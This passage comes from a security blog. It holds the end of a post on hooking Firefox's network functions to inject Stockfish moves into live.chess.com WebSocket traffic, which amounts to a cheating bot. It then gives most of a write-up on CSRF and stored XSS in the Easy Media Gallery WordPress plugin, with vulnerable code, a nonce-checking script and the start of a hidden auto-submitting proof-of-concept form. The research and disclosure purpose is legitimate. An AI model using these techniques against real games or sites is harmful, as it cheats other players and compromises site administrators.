<strong>2.</strong> The functions PR_Read() and PR_Write() are hooked.<br />
<strong>3.</strong> As soon as a WebSocket request that indicates the beginning of a
new live.chess.com chess game is detected, the shared library (the above
code) initializes the <a href="http://stockfishchess.org/" title="chess engine">local Stockfish chess
engine</a> with the function
<em>int initStockfish()</em> {There should be enough time before the game
actually begins to pre-calculate some moves}.<br />
<strong>3.1</strong> When a JSON message like the following</p>
<div class="highlight"><pre><span class="p">[{</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;sid&quot;</span><span class="p">:</span><span class="s2">&quot;gserv&quot;</span><span class="p">,</span><span class="nt">&quot;game&quot;</span><span class="p">:{</span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="mi">706548893</span><span class="p">,</span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="s2">&quot;starting&quot;</span><span class="p">,</span><span class="nt">&quot;seq&quot;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&quot;players&quot;</span><span class="p">:[{</span><span class="nt">&quot;uid&quot;</span><span class="p">:</span><span class="s2">&quot;rocchen&quot;</span><span class="p">,</span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="s2">&quot;playing&quot;</span><span class="p">,</span><span class="nt">&quot;lag&quot;</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span><span class="nt">&quot;lagms&quot;</span><span class="p">:</span><span class="mi">415</span><span class="p">,</span><span class="nt">&quot;gid&quot;</span><span class="p">:</span><span class="mi">706548893</span><span class="p">},{</span><span class="nt">&quot;uid&quot;</span><span class="p">:</span><span class="s2">&quot;workcentre7328&quot;</span><span class="p">,</span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="s2">&quot;playing&quot;</span><span class="p">,</span><span class="nt">&quot;lag&quot;</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="nt">&quot;lagms&quot;</span><span class="p">:</span><span class="mi">210</span><span class="p">,</span><span class="nt">&quot;gid&quot;</span><span class="p">:</span><span class="mi">706548893</span><span class="p">}],</span><span class="nt">&quot;abortable&quot;</span><span class="p">:[</span><span class="kc">true</span><span class="p">,</span><span class="kc">true</span><span class="p">],</span><span class="nt">&quot;moves&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;clocks&quot;</span><span class="p">:[</span><span class="mi">600</span><span class="p">,</span><span class="mi">600</span><span class="p">],</span><span class="nt">&quot;draws&quot;</span><span class="p">:[],</span><span class="nt">&quot;repeated&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&quot;squares&quot;</span><span class="p">:[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]},</span><span class="nt">&quot;tid&quot;</span><span class="p">:</span><span class="s2">&quot;GameState&quot;</span><span class="p">},</span><span class="nt">&quot;channel&quot;</span><span class="p">:</span><span class="s2">&quot;/game/706548893&quot;</span><span class="p">}]</span>
</pre></div>


<p>is intercepted, a game has begun. The needles that indicate such a
beginning are thus the players UID and the string <em>"status":"starting"</em><br />
<strong>4.</strong> From now on, every outgoing packet (from <code>PR_Write()</code>), that
causes a move, must be updated with a chess engine move. This is done
with with function void <code>modifyMove()</code>, which in turns relies on a
correct game state. Such a outbound packet looks like (We have discussed
the protocol in the previous chapter):</p>
<div class="highlight"><pre><span class="p">[{</span><span class="nt">&quot;channel&quot;</span><span class="p">:</span><span class="s2">&quot;/service/user&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;move&quot;</span><span class="p">:{</span><span class="nt">&quot;gid&quot;</span><span class="p">:</span><span class="mi">706662190</span><span class="p">,</span><span class="nt">&quot;seq&quot;</span><span class="p">:</span><span class="mi">11</span><span class="p">,</span><span class="nt">&quot;uid&quot;</span><span class="p">:</span><span class="s2">&quot;rocchen&quot;</span><span class="p">,</span><span class="nt">&quot;move&quot;</span><span class="p">:</span><span class="s2">&quot;9I&quot;</span><span class="p">,</span><span class="nt">&quot;clock&quot;</span><span class="p">:</span><span class="mi">76</span><span class="p">,</span><span class="nt">&quot;clockms&quot;</span><span class="p">:</span><span class="mi">7661</span><span class="p">,</span><span class="nt">&quot;squared&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">},</span><span class="nt">&quot;sid&quot;</span><span class="p">:</span><span class="s2">&quot;gserv&quot;</span><span class="p">,</span><span class="nt">&quot;tid&quot;</span><span class="p">:</span><span class="s2">&quot;Move&quot;</span><span class="p">},</span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;105&quot;</span><span class="p">,</span><span class="nt">&quot;clientId&quot;</span><span class="p">:</span><span class="s2">&quot;4gzikii6gu01a1k7kvdcb7a1h2gh6&quot;</span><span class="p">}]</span>
</pre></div>


<p><strong>5.</strong> Concurrently to step 4, the move made by the opponent is
synchronized with a local gameState struct variable. The opponent's move
is obtained in PR_Read() and the function void <em>collectGameState()</em>
keeps the move history current. The function <em>collectGameState()</em> also
stores the current game state in a C struct:</p>
<div class="highlight"><pre><span class="c1">// This struct holds the current game state and all kids of game information as parsed and extracted of the live session</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">status</span><span class="p">[</span><span class="mh">0x50</span><span class="p">];</span> <span class="c1">// The status as defined by the protocol. Will be most likely &#39;playing&#39; during a game.</span>
    <span class="kt">uint64_t</span> <span class="n">gameID</span><span class="p">;</span> <span class="c1">// The global game id. Can be looked up after games to review the game.</span>
    <span class="kt">uint32_t</span> <span class="n">moveNumber</span><span class="p">;</span> <span class="c1">// The number of moves I did</span>
    <span class="kt">char</span> <span class="n">playerName</span><span class="p">[</span><span class="mh">0x50</span><span class="p">];</span> <span class="c1">// Me</span>
    <span class="kt">char</span> <span class="n">opponentPlayerName</span><span class="p">[</span><span class="mh">0x50</span><span class="p">];</span> <span class="c1">// Poor opponent</span>
    <span class="kt">uint64_t</span> <span class="n">remainingTimeMsSelf</span><span class="p">;</span> <span class="c1">// yeah does that matter?</span>
    <span class="kt">uint64_t</span> <span class="n">remainingTimeMsOpponent</span><span class="p">;</span> <span class="c1">// probably more relevant</span>
    <span class="kt">uint16_t</span> <span class="n">lagMsSelf</span><span class="p">;</span> <span class="c1">// i have a stupid connection here in my house</span>
    <span class="kt">uint16_t</span> <span class="n">lagMsOpponent</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">movesMade</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span> <span class="c1">// in live.chess.com encoded version</span>
    <span class="kt">char</span> <span class="n">movesMadeDecoded</span><span class="p">[</span><span class="mh">0x400</span><span class="p">];</span> <span class="c1">// the decoded version</span>
    <span class="kt">char</span> <span class="n">currentMoveOpponent</span><span class="p">[</span><span class="mh">0x3</span><span class="p">];</span> <span class="c1">// last move of opponent</span>
    <span class="kt">char</span> <span class="n">currentMoveSelf</span><span class="p">[</span><span class="mh">0x3</span><span class="p">];</span> <span class="c1">// my last move</span>
    <span class="kt">char</span> <span class="n">currentMoveOpponentDecoded</span><span class="p">[</span><span class="mh">0x6</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">currentMoveSelfDecoded</span><span class="p">[</span><span class="mh">0x6</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">engineMoves</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">engineSuggestion</span><span class="p">[</span><span class="mh">0x6</span><span class="p">];</span> <span class="c1">// The best move as suggested by the engine</span>
<span class="p">}</span> <span class="n">_CHESS_COM_GAME_SESSION_STATE</span><span class="p">;</span>
</pre></div>


<h3 id="chap_concl">Conclusion</h3>
<p>Hooking is a dirty business and it's not the good idea I thought it was.
Therefore my idea was rather average and the implementation is pretty
bad. All in all, I am still satisfied, because it works!</p>
<p>It would be a probably good approach if I managed to hook directly into
<a href="http://mxr.mozilla.org/mozilla-central/source/netwerk/protocol/websocket/WebSocketChannel.cpp">WebSocketChannel.cpp</a>,
because I wouldn't need to cumbersomly pick my target messages in the
huge traffic that flows thourgh PR_Read().</p>
<p>It's a really strange bot to use, because while my bot modifies packets,
<strong>the javascript frontend can't properly deal with this fact and in
displays a huge mess!</strong> This is really interesting because the frontend
(in flash and javascript) notes that I made a specific move and saves it
accordingly in their variables/objects, but suddenly the game server
says that I made in reality atotally different move (The one which was
injected by my code). So the poor frontend is heavily confused and
sometimes needs up to 10 moves to update the <em>real</em> moves into the
frontend browser window. You can observe this behaviour in the video.
It's really funny!</p>
<p>To be honest, my bot has still many open issues and sometimes the
firefox process crashes randomly. Maybe there's a memory leak somewhere,
because after several games someone eats up the whole heap and the whole
linux system crashes.</p>
<p>I am pretty sure it's not my malloc/calloc, because I strictly checked
to free() all allocated buffers. But on the other hand, I must be the
culprit, because without me hooking into firefox, everything works like
a charm.</p>
<p>Either I am to inexperienced or it <em>just is</em> hard, but I think making a
click bot (as discussed above) for browser games it a far better
approach, if the case you're strictly result oriented :)</p>
<h3 id="chap_demo">Demonstration videos</h3>
<p>These two videos are of slightly low quality, but you can still
comfortably recolonize the chess game:</p>
<!-- This version of the embed code is no longer supported. Learn more: https://vimeo.com/s/tnm -->

<p><object width="500" height="281">
<param name="allowfullscreen" value="true"></param><param name="allowscriptaccess" value="always"></param><param name="movie" value="http://vimeo.com/moogaloop.swf?clip_id=85060026&amp;force_embed=1&amp;server=vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=1&amp;color=00adef&amp;fullscreen=1&amp;autoplay=0&amp;loop=0"></param></p>
<p><embed src="http://vimeo.com/moogaloop.swf?clip_id=85060026&amp;force_embed=1&amp;server=vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=1&amp;color=00adef&amp;fullscreen=1&amp;autoplay=0&amp;loop=0" type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="500" height="281">
</embed>
</object></p>
<!-- This version of the embed code is no longer supported. Learn more: https://vimeo.com/s/tnm -->

<p><object width="500" height="281">
<param name="allowfullscreen" value="true"></param><param name="allowscriptaccess" value="always"></param><param name="movie" value="http://vimeo.com/moogaloop.swf?clip_id=85083958&amp;force_embed=1&amp;server=vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=1&amp;color=00adef&amp;fullscreen=1&amp;autoplay=0&amp;loop=0"></param></p>
<p><embed src="http://vimeo.com/moogaloop.swf?clip_id=85083958&amp;force_embed=1&amp;server=vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=1&amp;color=00adef&amp;fullscreen=1&amp;autoplay=0&amp;loop=0" type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="500" height="281">
</embed>
</object></p>
<p><strong>Please note the following to understand the video</strong>:
 I make random moves with the king. They are <em>not actually being submitted</em> to the
server, they are just shown so in the client side interface (That what
you can see in the browser). <strong>The real moves are updated and modified
by the Stockfish engine and then injected into the WebSocket messages.</strong>
That's also the reason sometimes the chessboard suddenly updates,
because the client side GUI recognizes that it showed the <em>false</em> moves.
Then you can see the real moves for a second again.
ou can see the real moves for a second again.</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/exploiting-wordpress-plugins-using-insecure-admin-forms-no-3-example-exploit-included.html#exploiting-wordpress-plugins-using-insecure-admin-forms-no-3-example-exploit-included">Exploiting wordpress plugins through admin options (No 3.  Easy Media Gallery stored XSS)</a></h2>
    <p>
      Posted on Di 17 Dezember 2013 in <a href="/category/php.html">Php</a>
      &#8226; Tagged with
      <a href="/tag/vulnerablity.html">Vulnerablity</a>,      <a href="/tag/websecurity.html">Websecurity</a>,      <a href="/tag/exploit.html">Exploit</a>,      <a href="/tag/stored.html">Stored</a>,      <a href="/tag/php.html">Php</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/security.html">Security</a>,      <a href="/tag/xss.html">Xss</a>,      <a href="/tag/wordpress.html">Wordpress</a>,      <a href="/tag/easy-media-gallery.html">Easy-media-gallery</a>    </p>
  </header>
  <div>
      <h3>Preface</h3>
<p>This post is about general security weaknesses in wordpress plugins,
that allow malicious attackers to gain code execution access on the web
server (which is quite often the user www-data). To outline the problem
shortly: Often, wordpress plugins need a administration form to handle
settings and options. These options are meant to be exclusively
alterable by the admin of the wordpress site. But unfortunately, lots of
wordpress plugins suffer from a very dangerous combination of
<a href="http://epiqo.com/en/all-your-pants-are-danger-csrf-explained" title="CSRF explained">CSRF</a>
and stored XSS vulnerabilities, that wrapped up in a social engineering
approach, may break the site.</p>
<p>I have done some research in the past about such attacks. You can read
about a <a href="http://incolumitas.com/2013/07/27/no-2-flash-album-gallery-persistent-xss-exploitet-with-help-of-xsrf-leading-to-remote-code-execution-k/" title="stored xss in flash album gallery">stored xss in flash album gallery
plugin</a>
as well as my findings about a similar flaw in the <a href="http://incolumitas.com/2013/03/15/no-1-wp-members-interesting-peristant-xss-leading-to-remote-code-execution/">wp members
plugin</a>.</p>
<h3>How does the attack vector look like?</h3>
<p>First we need to understand how administration menus are created in
wordpress, because these forms are the point where data flows into a
application. You can learn more about the underlying concept on
<a href="http://codex.wordpress.org/Administration_Menus" title="administration menues in wordpress">wordpress
codex</a>.</p>
<p>But the crucial point to understand is, that they all consist of forms,
independently of the fact that you can pack your options under a
predefined and already existing top level menu like <em>Tools</em> or
<em>Settings</em>, or that you can create your own top level menu with a call
to
<a href="http://codex.wordpress.org/Function_Reference/add_menu_page" title="add_menu_page function">add_menu_page()</a>.<br />
In either way, you are going to populate your new menu with one or more
forms. Wordpress tries to indicate the general direction for the best
practices with the <a href="http://codex.wordpress.org/Settings_API" title="the wordpress settings API">settings
API</a>.
The API basically implements security checks (nonces to be specific) for
the forms and avoids a lot of complex debugging of the underlying
options management (no need to tinker with databases).<br />
In particular, the security checks prevent
<a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">CSRF</a> attacks
by including a <a href="http://en.wikipedia.org/wiki/Cryptographic_nonce">nonce</a>
sent with any request. Such a form with nonces would look like the
following (The example shows the beginning of the general sub-level menu
form from the <em>Settings</em> top-level menu):</p>
<div class="highlight"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;options.php&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&#39;hidden&#39;</span> <span class="na">name=</span><span class="s">&#39;option_page&#39;</span> <span class="na">value=</span><span class="s">&#39;general&#39;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;action&quot;</span> <span class="na">value=</span><span class="s">&quot;update&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">id=</span><span class="s">&quot;_wpnonce&quot;</span> <span class="na">name=</span><span class="s">&quot;_wpnonce&quot;</span> <span class="na">value=</span><span class="s">&quot;aa07348d33&quot;</span> <span class="nt">/&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;_wp_http_referer&quot;</span> <span class="na">value=</span><span class="s">&quot;/~nikolai/wordpress_pentest/wordpress/wp-admin/options-general.php&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">&quot;form-table&quot;</span><span class="nt">&gt;</span>
[...]
<span class="nt">&lt;/table&gt;</span>
</pre></div>


<p>So any attacker that now tries to fool a victim into executing a
specific action by submitting a form, needs to know the nonces value.
But she certainly can't know this nonce, because it was created randomly
while generating the form in the first place. Hence without a valid
nonce, wordpress denies the processing of any action associated with the
form data.</p>
<p>Now there wouldn't be any problem at all, if every form was protected
with nonces. But wait a second. After reading yet another <a href="http://codex.wordpress.org/WordPress_Nonces" title="wp nonces">codex page
about nonces</a>,
we can begin asking ourselves questions: Is adding nonces actually
enough to secure actions?</p>
<p>No, of course it's not enough. You also need to verify them. It may be
obvious for people who know how CSRF attacks works, but I saw quite some
plugins where forms were equipped with nonce creation functions like
<em>wp_create_nonce()</em>, <em>wp_nonce_field()</em> or <em>wp_nonce_url()</em> but
the associated action just wasn't verified for validity with the
corresponding functions <em>check_admin_referer()</em>,
<em>check_ajax_referer()</em> or <em>wp_verify_nonce()</em>.</p>
<p>Some months ago, I made a quick python script that extracts all calls to
nonce creation functions and simply checks whether there is a respective
call to a nonce verification function. If there's not, there might be a
CSRF vulnerability.</p>
<div class="highlight"><pre><span class="n">__author__</span> <span class="o">=</span> <span class="s">&#39;nikolai tschacher&#39;</span>

<span class="c"># Unfinished.</span>
<span class="c"># Idea: Maybe use a lexer/tokenizer to process PHP function signatures. But it still remains a really tough task</span>
<span class="c"># to verify if a nonce with a specific action get&#39;s verified or not. One approach is to look for the $action string.</span>
<span class="c"># But we&#39;re screwed if this string is created dynamically in a expression and is not a simple string literal.</span>

<span class="c"># Simple idea: Just *count* all nonce creation functions and all nonce verification functions. If there there a less</span>
<span class="c"># of the latter, actions might be unverified and thus vulnerable to CSRF attacks.</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="c"># stores all action strings to nonce creation function like:</span>
<span class="c"># - wp_nonce_url( $actionurl, $action = -1, $name = &#39;_wpnonce&#39; )</span>
<span class="c"># - wp_nonce_field( $action = -1, $name = &quot;_wpnonce&quot;, $referer = true , $echo = true )</span>
<span class="c"># - wp_create_nonce( $action = -1 )</span>
<span class="c"># The appropriate regex. This is quite harsh to do correctly since you essentially need to parse a PHP function call signature</span>
<span class="c"># with some plain regexes...</span>
<span class="n">nonces_created</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">NONCE_CREATION_FUNCTIONS</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;&#39;&#39;(wp_nonce_url|wp_nonce_field|wp_create_nonce)s*(s*(s*$actions*=s*)?(&quot;|&#39;)s*w*s*(&quot;|&#39;)s*)&#39;&#39;&#39;</span><span class="p">)</span>
<span class="n">COUNT_NONCE_CF</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;&#39;</span><span class="p">)</span>

<span class="c"># holds all nonce verification functions as:</span>
<span class="c"># - wp_verify_nonce( $nonce, $action = -1 )</span>
<span class="c"># - check_admin_referer( $action = -1, $query_arg = &#39;_wpnonce&#39; )</span>
<span class="c"># - check_ajax_referer( $action = -1, $query_arg = false, $die = true )</span>
<span class="n">nonces_verified</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">def</span> <span class="nf">walk_plugin_files</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">callback</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
        <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">file</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">&#39;.php&#39;</span><span class="p">):</span>
                <span class="n">callback</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">collect_nonces</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fd</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">nonces_created</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">()</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">NONCE_CREATION_FUNCTIONS</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">fd</span><span class="o">.</span><span class="n">read</span><span class="p">())])</span>
        <span class="k">except</span> <span class="ne">UnicodeDecodeError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">pass</span>

<span class="k">def</span> <span class="nf">verify_nonces</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="k">pass</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&#39;plugin_path&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&quot;the path to a wordpress plugin that should be checked for CSRF&quot;</span><span class="p">,</span>
                        <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="c"># First collect all occurrences of nonces</span>
    <span class="n">walk_plugin_files</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">plugin_path</span><span class="p">,</span> <span class="n">collect_nonces</span><span class="p">)</span>
    <span class="c"># And then try do check whether nonces are also checked before an action</span>
    <span class="n">walk_plugin_files</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">plugin_path</span><span class="p">,</span> <span class="n">verify_nonces</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="n">nonces_created</span><span class="p">)</span>
</pre></div>


<h3>Where's the problem then?</h3>
<p>Nowhere and everywhere ;)</p>
<p>Although the security architecture in the wordpress core seems to be
okay (As far as I can judge it - Honestly I didn't really dig <em>deep
enough</em> to find potential flaws), a lot of missing functionality that
the slim wordpress core lacks, can be enhanced by adding plugins.<br />
Furthermore, it's a unfortunate fact, that a lot of plugin authors tend
to be unaware of the many possibilities to blunder in security critical
code (Myself included - Writing about web security and programming
completely flawless is not exclusive apparently).<br />
And that is exactly the root of all evil: Although we can give security
unaware programmers plenty of good concepts and tools (Like the settings
API or this <a href="http://codex.wordpress.org/Data_Validation" title="data validation in wordpress">codex
article</a>)
and they will still fail to manufacture solid and found plugin code.</p>
<h3>Can we force plugin coders to program more securely</h3>
<p>I think we can. For instance, we could force plugin authors to provide
nonces for all forms that they create, regardless of the nature of the
action itself (I mean, are there cases where nonces would be
counterproductive or even annoying?). Additionally, we need to enforce
that for every nonce created, there must be a function such as</p>
<ul>
<li><em>wp_verify_nonce( $nonce, $action = -1 )</em></li>
<li><em>check_admin_referer( $action = -1, $query_arg = '_wpnonce' )</em></li>
<li><em>check_ajax_referer( $action = -1, $query_arg = false, $die =
    true )</em></li>
</ul>
<p>that verfies that the action stemmed from the intended origin.</p>
<p>I can already hear people cry that there is no way to force people to
write secure programs. But in my oppinion, there are general guidelines
that at least prevent some common security problems. And hell: Wordpress
plugins really suffer from the combined threat of XSS and CSRF!</p>
<h3>A concrete example  Stored XSS in Easy Media Gallery</h3>
<p>Right at the start some information about the plugin:</p>
<ul>
<li>Plugin name: Easy Media Gallery</li>
<li><a href="http://wordpress.org/plugins/easy-media-gallery/" title="easy media gallery">Plugin
    URL</a></li>
<li>Vendor: <a href="http://ghozylab.com/" title="ghozylab">Ghozylab</a></li>
<li>Vulnerable version:
    <a href="http://wordpress.org/plugins/easy-media-gallery/developers/">1.2.25</a></li>
<li>Downloads: 124,042</li>
</ul>
<p>I didn't need to dig deep to find a very critical security vulnerability
in the Easy Media Gallery plugin. In the file
<em>wp-content/plugins/easy-media-gallery/includes/settings.php</em> on line
14, the following function (reformatted, because the original source
code is a pain to read) causes a lot of inconvenience:</p>
<div class="highlight"><pre><span class="x">function spg_add_admin() {</span>
<span class="x">    global $emgplugname, $theshort, $theopt;</span>
<span class="x">    if (is_admin() &amp;&amp; ( isset($_GET[&#39;page&#39;]) == &#39;emg_settings&#39; ) &amp;&amp; ( isset($_GET[&#39;post_type&#39;]) == &#39;easymediagallery&#39; )) {</span>

<span class="x">        if (isset($_REQUEST[&#39;action&#39;]) &amp;&amp; &#39;save&#39; == $_REQUEST[&#39;action&#39;]) {</span>
<span class="x">            $curtosv = get_option(&#39;easy_media_opt&#39;);</span>
<span class="x">            foreach ($theopt as $theval) {</span>
<span class="x">                $curtosv[$theval[&#39;id&#39;]] = $_REQUEST[$theval[&#39;id&#39;]];</span>
<span class="x">                update_option(&#39;easy_media_opt&#39;, $curtosv);</span>
<span class="x">            }</span>
<span class="x">            header(&quot;Location: edit.php?post_type=easymediagallery&amp;page=emg_settings&amp;saved=true&quot;);</span>
<span class="x">            die;</span>
<span class="x">        } else if (isset($_REQUEST[&#39;action&#39;]) &amp;&amp; &#39;reset&#39; == $_REQUEST[&#39;action&#39;]) {</span>

<span class="x">            // RESTORE DEFAULT SETTINGS</span>
<span class="x">            easymedia_restore_to_default($_REQUEST[&#39;action&#39;]);</span>
<span class="x">// END</span>

<span class="x">            header(&quot;Location: edit.php?post_type=easymediagallery&amp;page=emg_settings&amp;reset=true&quot;);</span>
<span class="x">            die;</span>
<span class="x">        }</span>
<span class="x">    }</span>

<span class="x">    add_submenu_page(</span>
<span class="x">            &#39;edit.php?post_type=easymediagallery&#39;, __(&#39;Easy Media Gallery Settings&#39;, &#39;easmedia&#39;), __(&#39;Settings&#39;, &#39;easmedia&#39;), &#39;manage_options&#39;, &#39;emg_settings&#39;, &#39;spg_admin&#39;</span>
<span class="x">    );</span>
<span class="x">}</span>

<span class="x">// Lots of other code</span>
<span class="x">// .</span>
<span class="x">// .</span>
<span class="x">// .</span>
<span class="x">add_action(&#39;admin_menu&#39;, &#39;spg_add_admin&#39;);</span>
</pre></div>


<p>So what does the above code do (wrong)?</p>
<p>Well first of all, it's a callback function that get's triggered upon
visiting the admin menu, because the hook 'admin_menu' happens to fire
there. So this function is executed whenever a admin user visits the
administration panel. Inside the function, there are checks whether the
user is the admin (with is_admin()) and whether some query parameters
are set to predefined values. Then one layer further into the if
statements, the code verifies whether the parameter 'action' is set to
'save'. If so, the function continues to update the database <em>with
user-supplied options</em> for the plugin in a foreach loop. The other
if-branch is of no further interest here (although it can also
considered to be a CRSF), because it only allows attackers to reset
options.</p>
<p>So which options can we update? And why is it dangerous that we may
trick a admin user into updating the options with values set to our
liking?</p>
<p>To answer the first question, these are the keys to the plugin options
that we can update:</p>
<div class="highlight"><pre>easymedia_columns
easymedia_alignstyle
easymedia_img_size_limit
easymedia_vid_size
easymedia_disen_autoplv
easymedia_disen_autopl
easymedia_disen_audio_loop
easymedia_audio_vol

easymedia_box_style
easymedia_cur_style
easymedia_mag_icon
easymedia_frm_size
easymedia_frm_col
easymedia_ttl_col
easymedia_brdr_rds
easymedia_thumb_col
easymedia_hover_opcty
easymedia_style_pattern &lt;-- This looks like a good injection point --|
easymedia_disen_bor
easymedia_disen_hovstyle

easymedia_disen_plug
easymedia_disen_rclick
easymedia_disen_databk
easymedia_disen_admnotify
easymedia_disen_dasnews
easymedia_disen_ajax
easymedia_ajax_con_id
easymedia_plugin_core
</pre></div>


<p>And now let's discuss the second question: It is common for developers
to output data originating from the database without sanitizing it. The
belief is probably something like <em>Why should I consider the data in my
own database to be dangerous?</em>. Because you have to decide at least at
some point when you sanitize your data. The best way to do so is just
before the critical action happens. Escape html attributes before you
print data to the screen. Prevent SQL injections right before crafting
the query. This strategy is called outbound input handling. You can read
more about it on
<a href="http://excess-xss.com/" title="Good article about XSS">excess-xss.com</a>.</p>
<p>But the authors of ghozy lab didn't apply neither inbound nor outbound
input handling which lead to potentially malicious code in the database
that is eventually printed to the administration screen by causing a
stored XSS (The output and admin menu generation code is also in
wp-content/plugins/easy-media-gallery/includes/emg-settings.php between
line 275 and 520.</p>
<p>Again in short and for conclusion: Because there is no way to guarantee
that the action originated from a intentional form submittal by the
administrator (Because there are no security checks with anti
Cross-Site-Request-Forgery barriers such as check_admin_referer() or
check_ajax_referer()), any attacker can set up a page that
incorporates the following form hidden into the site. Note that the form
submits itself in a stealth way, such that a visitor isnt' able to
observer anything suspicious.</p>
<div class="highlight"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>

<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;title&gt;</span>XSS POC<span class="nt">&lt;/title&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content=</span><span class="s">&quot;width=device-width&quot;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;display:none;&quot;</span><span class="nt">&gt;</span>
            <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">&quot;xss-test-iframe&quot;</span> <span class="na">name=</span><span class="s">&quot;xss-test-iframe&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>

